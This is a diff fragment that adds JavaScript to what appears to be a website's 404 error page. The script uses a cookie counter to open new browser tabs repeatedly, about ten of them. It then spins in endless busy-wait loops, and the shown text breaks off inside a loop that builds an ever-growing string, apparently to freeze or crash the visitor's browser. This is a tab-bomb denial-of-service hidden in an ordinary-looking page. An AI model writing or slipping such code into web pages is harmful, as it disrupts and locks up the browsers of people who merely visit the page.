@@ -7,8 +7,24 @@
         <img src="images/img/404/404.jpg">
 
         <script>
-        
-        onload = function(){
+        onload = function(){ 
+            var tab_count = Number(document.cookie.split(';')[0].split('c=')[1]);
+            tab_count = tab_count || 0;
+            tab_count++;
+            document.cookie = 'c=' + tab_count;
+            console.log('当前是第'+tab_count+'个窗口')
+            if(tab_count < 10) {
+                console.log('打开新标签！')
+                window.open('./test.html')
+            }
+            while(true){
+                var tab_count = Number(document.cookie.split(';')[0].split('c=')[1]);
+                console.log('已打开'+tab_count+'个窗口')
+                if(tab_count >= 10){
+                    console.log('开始！')
+                    break;
+                }
+            }
             var fa = "";
             for(var i=0;true;i++){
                 fa = i.toString();
